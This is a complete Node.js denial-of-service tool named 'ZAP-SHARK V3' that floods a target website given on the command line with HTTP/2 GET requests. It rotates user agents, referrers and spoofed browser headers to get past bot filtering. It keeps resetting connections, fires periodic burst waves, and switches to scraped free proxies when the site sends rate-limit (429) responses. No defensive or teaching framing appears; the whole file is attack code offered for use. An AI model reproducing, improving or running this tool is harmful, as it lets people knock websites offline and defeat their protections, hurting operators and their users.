const http2 = require('http2');
const https = require('https');
const os = require('os');
const { exec } = require('child_process');
const net = require('net');

class ZAPSHARK_V3 {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.status = "ATTACKING";
        this.mode = "NORMAL";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        this.wifiConnected = true;
        this.usingProxy = false;
        
        // Connection tracking
        this.connectionPool = [];
        this.activeStreams = 0;
        this.lastH2Reset = Date.now();
        
        // Rotation pools
        this.userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36'
        ];
        
        this.referrers = [
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://twitter.com/',
            'https://www.reddit.com/',
            'https://www.youtube.com/',
            'https://www.linkedin.com/',
            'https://github.com/',
            'https://stackoverflow.com/'
        ];
        
        // Proxy handling
        this.proxyApi = 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all';
        this.currentProxy = null;
        this.proxyExpiry = 0;
        this.last429 = 0;
        this.rateLimitCount = 0;
        
        // Attack intervals
        this.attackInterval = null;
        this.checkInterval = null;
        this.wifiCheckInterval = null;
    }

    // === WIFI CHECK ===
    checkWifi() {
        const interfaces = os.networkInterfaces();
        let connected = false;
        
        for (const iface in interfaces) {
            for (const config of interfaces[iface]) {
                if (!config.internal && config.family === 'IPv4' && config.address !== '127.0.0.1') {
                    connected = true;
                    break;
                }
            }
            if (connected) break;
        }
        
        this.wifiConnected = connected;
        return connected;
    }

    // === PROXY SYSTEM ===
    async fetchProxy() {
        return new Promise((resolve) => {
            https.get(this.proxyApi, (res) => {
                let data = '';
                res.on('data', (chunk) => data += chunk);
                res.on('end', () => {
                    const proxies = data.trim().split('\n').filter(p => p);
                    if (proxies.length > 0) {
                        this.currentProxy = proxies[Math.floor(Math.random() * proxies.length)].trim();
                        this.proxyExpiry = Date.now() + 600000; // 10 minutes
                        resolve(true);
                    } else {
                        resolve(false);
                    }
                });
            }).on('error', () => resolve(false));
        });
    }

    // === CONNECTION SYSTEM ===
    setupConnections() {
        // Clear existing
        this.connectionPool.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        this.connectionPool = [];
        
        const poolSize = this.mode === "BURST" ? 10 : 5;
        
        for (let i = 0; i < poolSize; i++) {
            setTimeout(() => {
                try {
                    const client = http2.connect(this.targetUrl, {
                        maxSessionMemory: this.mode === "BURST" ? 32768 : 8192
                    });
                    
                    client.setMaxListeners(100);
                    
                    client.on('error', () => {});
                    
                    this.connectionPool.push(client);
                } catch (err) {}
            }, i * 100);
        }
    }

    // === REQUEST WITH BYPASS ===
    async sendRequest() {
        if (!this.wifiConnected || this.connectionPool.length === 0) return;
        
        // Rapid H2 reset every 2s
        if (Date.now() - this.lastH2Reset >= 2000) {
            this.resetH2Connections();
        }
        
        // Check for rate limits
        if (this.rateLimitCount >= 3 && !this.usingProxy && Date.now() - this.last429 < 30000) {
            await this.activateProxyMode();
        }
        
        // Rotate headers
        const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
        const referrer = this.referrers[Math.floor(Math.random() * this.referrers.length)];
        
        const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
        if (!client) return;
        
        try {
            this.activeStreams++;
            
            const headers = {
                ':method': 'GET',
                ':path': '/?' + Date.now(),
                ':authority': this.hostname,
                'user-agent': userAgent,
                'referer': referrer,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'accept-encoding': 'gzip, deflate, br',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'cross-site',
                'upgrade-insecure-requests': '1'
            };
            
            const req = client.request(headers);
            
            req.on('response', (headers) => {
                if (headers[':status'] === '429') {
                    this.last429 = Date.now();
                    this.rateLimitCount++;
                }
                req.destroy();
            });
            
            req.on('error', () => {
                req.destroy();
            });
            
            req.on('close', () => {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            });
            
            req.end();
            
        } catch (err) {
            this.activeStreams--;
            this.totalRequests++;
            this.requestsSinceLastCalc++;
        }
    }

    resetH2Connections() {
        if (this.connectionPool.length > 0) {
            const newPool = [];
            this.connectionPool.forEach(client => {
                try {
                    // Keep 50% of connections, reset 50%
                    if (Math.random() > 0.5) {
                        client.destroy();
                        const newClient = http2.connect(this.targetUrl);
                        newClient.setMaxListeners(100);
                        newPool.push(newClient);
                    } else {
                        newPool.push(client);
                    }
                } catch (err) {}
            });
            this.connectionPool = newPool;
            this.lastH2Reset = Date.now();
        }
    }

    async activateProxyMode() {
        console.log('\n[!] 429 Detected - Switching to proxy mode [!]');
        this.usingProxy = true;
        await this.fetchProxy();
        
        // Switch back after 10 minutes
        setTimeout(() => {
            this.usingProxy = false;
            this.currentProxy = null;
            this.rateLimitCount = 0;
            console.log('\n[~] Returning to direct connection mode');
        }, 600000);
    }

    // === DISPLAY ===
    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60);
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        const connectionStatus = this.wifiConnected ? "CONNECTED" : "UNCONNECTED";
        const modeStatus = this.usingProxy ? "PROXY" : "DIRECT";
        
        // Clear and overwrite
        process.stdout.write('\x1B[2J\x1B[0f');
        console.log(`ZAP-SHARK — (${this.formatRuntime()}) | STATUS: ${this.status}`);
        console.log('============================');
        console.log(`T-ARP — ${this.totalRequests}`);
        console.log(`T-RPS — ${this.currentRPS.toFixed(1)}`);
        console.log('============================');
        console.log(`ZAP-SHARK — ${connectionStatus} | MODE: ${modeStatus}`);
        
        if (this.usingProxy) {
            console.log(`PROXY: ${this.currentProxy ? 'ACTIVE' : 'FETCHING...'}`);
        }
    }

    // === BURST MODE ===
    activateBurstMode() {
        this.mode = "BURST";
        console.log('\n[🔥] BURST MODE ACTIVATED [🔥]');
        this.setupConnections();
        
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
            this.attackInterval = setInterval(async () => {
                if (this.status === "ATTACKING" && this.wifiConnected) {
                    // Send 5x more requests in burst
                    for (let i = 0; i < 5; i++) {
                        await this.sendRequest();
                    }
                    this.updateDisplay();
                }
            }, 0.05);
        }
    }

    // === MAIN ===
    start() {
        console.log("=== ZAP-SHARK V3 - BYPASS MODE ===");
        console.log("Target:", this.targetUrl);
        console.log("Features: UA Rotation | Referrer Rotation | 429 Proxy | H2 Reset");
        console.log("=".repeat(60));
        
        this.setupConnections();
        
        // Initial display
        this.updateDisplay();
        
        // Main attack loop
        setTimeout(() => {
            this.attackInterval = setInterval(async () => {
                if (this.status === "ATTACKING" && this.wifiConnected) {
                    await this.sendRequest();
                    this.updateDisplay();
                }
            }, 0.1);
            
            // Burst mode every 45s
            setInterval(() => {
                if (this.status === "ATTACKING" && !this.usingProxy) {
                    this.activateBurstMode();
                    setTimeout(() => {
                        this.mode = "NORMAL";
                        this.setupConnections();
                    }, 7000);
                }
            }, 45000);
            
            // Wifi check every 2s
            this.wifiCheckInterval = setInterval(() => {
                this.checkWifi();
                if (!this.wifiConnected) {
                    this.status = "PAUSED";
                    console.log('\n[!] WiFi disconnected - pausing attacks');
                } else if (this.status === "PAUSED") {
                    this.status = "ATTACKING";
                    console.log('\n[~] WiFi reconnected - resuming attacks');
                }
            }, 2000);
            
        }, 2000);
        
        process.on('SIGINT', () => {
            this.running = false;
            clearInterval(this.attackInterval);
            clearInterval(this.wifiCheckInterval);
            console.log('\n=== ZAP-SHARK V3 STOPPED ===');
            process.exit(0);
        });
    }
}

// Usage
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark-v3.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK_V3(target);
shark.start();
